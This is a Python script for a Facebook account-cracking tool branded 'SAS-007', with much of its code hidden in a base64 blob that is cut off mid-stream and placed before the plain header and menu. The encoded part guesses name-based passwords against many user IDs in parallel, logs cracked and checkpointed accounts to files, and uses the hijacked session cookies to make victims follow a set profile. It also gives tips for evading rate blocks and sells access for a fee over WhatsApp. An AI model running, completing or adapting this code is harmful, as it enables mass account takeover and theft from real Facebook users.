1QgT05FJyk7CiAgICAgICAgICAgIHNlbGYuc2FyZnJhengoaWQpCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6CiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3AKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJceDFiWzE7OTJtW1NvdW1pa10ge2xvb3B9fHtsZW4oc2VsZi5pZCl9IFtva11be2xlbihvayl9XSBbY3BdW3tsZW4oY3ApfV0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICBkYXMgPSB7CiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLAogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLAogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2Vib2ssCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH1bU291bWlrLU9LXSB7dXNlcn0gfCB7cHd9IikKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdTb3VtaWtfT0sudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwX3R0bCA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VzZXJ9P2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49e3Rva2Vuen0nKS5qc29uKClbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJwogICAgICAgICAgICAgICAgICAgICAgICBkYXkgICA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpCiAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBsb29wKz0xCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CiAgICAgICAgcHJpbnQoJ1sxXSBDUkFDSyBXSVRIIEFVVE8gUEFTUyAnKQogICAgICAgIHByaW50KCdbMl0gQ1JBQ0sgV0lUSCBOQU1FIERJR0lUIFBBU1MnKQogICAgICAgIGNoaSA9IGlucHV0KCdcbls/XSBDSE9PU0UgOiAnKQogICAgICAgIGlmIGNoaSA9PSAnJzoKICAgICAgICAgICAgcHJpbnQoJ1xuU0VMRUNUIENPUlJFQ1QgT05FJykKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVxyVVNFIEZMSUdIVCAoYWlycGxhbmUpIE1PREUgT05cMDMzWzE7OTZtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM2bVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEJBTkxBREVTSEkgQlJBTkQgQlJPCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiNzg2MTEwIl0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxpZiBjaGkgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzMybVxyRU5URVIgTEFTVCBOQU1FIERJR0lUc1wwMzNbMTszMm1cbiIpCiAgICAgICAgICAgIHAxID0gaW5wdXQoJyAgTmFtZSArIDEgOiAnKQogICAgICAgICAgICBwMiA9IGlucHV0KCcgIE5hbWUgKyAyIDogJykKICAgICAgICAgICAgcDMgPSBpbnB1dCgnICBOYW1lICsgMyA6ICcpCiAgICAgICAgICAgIHA0ID0gaW5wdXQoJyAgTmFtZSArIDQgOiAnKQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1cclVTRSBGTElHSFQgKGFpcnBsYW5lKSBNT0RFIEJFRk9SRSBVU0VcMDMzWzE7MzJtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMybVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzJtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEl0J3MgQmFubGFkZXNoaSBicmFuZCBicm8uCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJ1xuIFNlbGVjdCBWYWxpZCBPbmUnKQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKZGVmIGJuc2J1eSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIGZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQogICAgcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFN1YnNjcmlwdGlvbi4uLlxuJykKICAgIHRyeToKICAgICAgICBmID0gKGIneFx4OWNceGQzT0ksSVx4ZDRceDA3XHgxM1x4YzlceGY5XHhiOXolXHhhOUVceGI5XHhhNVx4MTVceGZhaVx4OTk5XHhhOVx4YzVceGZhXHhhNVx4YzVFXHhmYVx4YTklXHhjOVx4ZmFceDEwXHhjMVx4YTRceGNjPFx4MDB9XHgxZVx4MTFceDE3JykKICAgICAgICBiZCA9ICh6bGliLmRlY29tcHJlc3MoZikpCiAgICAgICAgdG8gPSAob3BlbihiZCwgJ3InKS5yZWFkKCkpCiAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICBibnNyZWcoKQogICAgdHJ5OgogICAgICAgIGJ0ID0gKGIneFx4OWNceGNiKCkpKFx4YjZceGQyXHhkNy9KLFx4ZDdLXHhjZixceGM5KE0qLU4tSlx4Y2VceGNmK0lceGNkK1x4ZDFLXHhjZVx4Y2ZceGQ1NzEwXHhkMVx4ZjVceGNiL1x4ZDF1d1xyXHhkMS9ceGQ2XHhjZk1ceGNjXHhjY1x4ZDNPXHgwNFx4MDAmIVx4MTMmJykKICAgICAgICBidyA9ICh6bGliLmRlY29tcHJlc3MoYnQpKQogICAgICAgIHIgPSAocmVxdWVzdHMuZ2V0KGJ3KS50ZXh0KQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHByaW50ICgiXHgxYlswOzM3bU5vIEludGVybmV0IENvbm5lY3Rpb24iKQogICAgICAgIGV4aXQoKQoKICAgIGlmIHRvIGluIHI6CiAgICAgICAgZnVjay5hcHBlbmQoMSkKICAgICAgICBzYXJmcmF6KCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgKGxvZ28pCiAgICAgICAgcHJpbnQgKCdceDFiWzE7OTdtXHJZb3VyIFRva2VuIElzIE5vdCBTdWJzY3JpYmVkXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCAoJ1xyXHgxYlsxOzk3bSBZb3VyIFRva2VuIDogJyArIHRvICsgJ1xuJykKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclRvb2wgUHJpY2UgMjAwVGtcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCgnXFdoYXRzYXBwIEFjY291bnQgTnVtYmVyIDAxNzczMTQ3NzE0XG4nKQogICAgICAgIHByaW50KCdcckFjY291bnQgTmFtZSBTb3VtaWsgQWhtZWRcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBzYiA9IGlucHV0KCdcclBhc3RlIEhlcmUgUGF5bWVudCBTdWNjZXNzZnVsbHkgTXNnOicpCiAgICAgICAgcHJpbnQgKCdcbicpCiAgICAgICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgICAgICBwcmludCgnXG4nKQogICAgICAgIHByaW50KCdccllvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICAgICAgdGtzID0gJ0hlbGxvJTIwQWRtaW4lMjBBcHByb3ZhbCUyMG15JTIwa2V5LiUyMHBheW1lbnQlMjBEb25lLCUyMCUyMEluZm9ybWF0aW9uJTIwOi0lMjAlMjAlMjBUcmFjayUyME1zZyUyMDolMjAlMjAnK3NiKyclMjBUb2tlbiUyMDolMjAnK3NzCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys5MjMyMDY2MjAyNjk/dGV4dD0nICsgdGtzKQoKZGVmIGJuc3JlZygpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIHByaW50ICgnXHgxYlsxOzk3bVx0WW91ciBUb2tlbiBJcyBOb3QgU3Vic2NyaWJlZFxuJykKICAgIHByaW50CiAgICBpZCA9IHN0cih1dWlkLnV1aWQxKHV1aWQuZ2V0bm9kZSgpLDApKVsyNDpdLnVwcGVyKCkgKyAiflNBUz09IgogICAgcHJpbnQKICAgIHByaW50ICgnXG5ceDFiWzE7OTdtIFlvdXIgVG9rZW46IFx4MWJbOTdtJyArIGlkICsgJ1xuJykKICAgIHByaW50CiAgICBwcmludCgnXHJUb29sIFByaWNlIDIwMFRLXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcV2hhdHNhcHAgQWNjb3VudCBOdW1iZXIgMDE3NzMxNDc3MTRcbicpCiAgICBwcmludCgnXHJBY2NvdW50IE5hbWUgU09VTUlLIEFITUVEXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgcHJpbnQKICAgIHNiID0gaW5wdXQoJ1xyUGFzdGUgSGVyZSBQYXltZW50IFN1Y2Nlc3NmdWxseSBNc2c6JykKICAgIHByaW50ICgnXG4nKQogICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgIHByaW50ICgnXG4nKQogICAgcHJpbnQoJ1lvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICB0a3MgPSAnSGVsbG8lMjBBZG1pbiUyMEFwcHJvdmFsJTIwbXklMjBrZXkuJTIwcGF5bWVudCUyMERvbmUsJTIwJTIwSW5mb3JtYXRpb24lMjA6LSUyMCUyMCUyMFRyYWNrJTIwTXNnJTIwOiUyMCUyMCcrc2IrJyUyMFRva2VuJTIwOiUyMCcrc3MKICAgIG9zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rOTIzMjA2NjIwMjY5P3RleHQ9JyArIHRrcykKICAgIGYgPSAoYid4XHg5Y1x4ZDNPSSxJXHhkNFx4MDdceDEzXHhjOVx4ZjlceGI5eiVceGE5RVx4YjlceGE1XHgxNVx4ZmFpXHg5OTlceGE5XHhjNVx4ZmFceGE1XHhjNUVceGZhXHhhOSVceGM5XHhmYVx4MTBceGMxXHhhNFx4Y2M8XHgwMH1ceDFlXHgxMVx4MTcnKQogICAgYmQgPSAoemxpYi5kZWNvbXByZXNzKGYpKQogICAgc2F2ID0gb3BlbihiZCwgJ3cnKSAKICAgIHNhdi53cml0ZShpZCkKICAgIHNhdi5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHRpbWUuc2xlZXAoMykKICAgIGV4aXQoKQpjbGFzcyBsb2FkOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIF8gPSAnJwogICAgICAgIF9fID0gaW50KCczMCcpCiAgICAgICAgX19fID0gaW50KCcwJykKICAgICAgICBfXyAtPSAxCiAgICAgICAgX19fICs9IDEKICAgICAgICBmb3IgdCBpbiByYW5nZShpbnQoIjEiKSk6CiAgICAgICAgICAgIHByaW50KCdcciBQbGVhc2UgV2FpdCAuLi4uJykKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgIHByaW50KCdcbicpCgpzYXJmcmF6KCkK


#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
   
   ░█▀▀▀█ ░█▀▀▀█ ░█─░█ ░█▀▄▀█  ▀█▀ ░█─▄▀ 
   ─▀▀▀▄▄ ░█──░█ ░█─░█ ░█░█░█  ░█─ ░█▀▄─ 
   ░█▄▄▄█ ░█▄▄▄█ ─▀▄▄▀ ░█──░█  ▄█▄ ░█─░█
              
              It’s Bangladeshi Brand😉
              
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           SAS-007
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          soumik956
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           SAS-007
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             9.0.0
\033[1;37m------------------------\033[1;37m------------------------ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSAS_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSAS_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SAS Menu ")
	    soumik()

def soumik():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [2] Create File [Best-Method]')
